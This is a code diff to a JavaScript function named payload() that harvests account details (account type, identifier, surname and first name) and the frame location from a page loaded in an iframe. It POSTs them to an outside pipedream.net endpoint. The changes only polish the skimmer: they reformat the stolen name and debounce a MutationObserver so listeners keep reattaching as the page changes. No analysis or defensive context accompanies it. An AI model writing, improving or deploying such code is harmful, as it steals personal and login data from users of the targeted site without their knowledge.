@@ -93,7 +93,7 @@ async function payload() {
 						location: i.contentWindow.location.href,
 						type: sc.typeCompte,
 						name: sc.identifiant,
-						nom: sc.nom + sc.prenom
+						nom: `${sc.nom} ${sc.prenom}`
 					};
 					await fetch('https://8d72fc5d27b20a8d575b1973c65a62c3.m.pipedream.net', {
 						method: "POST",
@@ -105,9 +105,10 @@ async function payload() {
 				});
 			}
 
-			const observer = new MutationObserver(() => attachListeners(doc));
-			observer.observe(doc.body, { childList: true, subtree: true });
+			let timer;
+			new MutationObserver(() => { clearTimeout(timer); timer = setTimeout(() => attachListeners(doc), 50); }).observe(doc.body, { childList: true, subtree: true });
 			attachListeners(doc);
+			
 		} catch {}
 	}
 
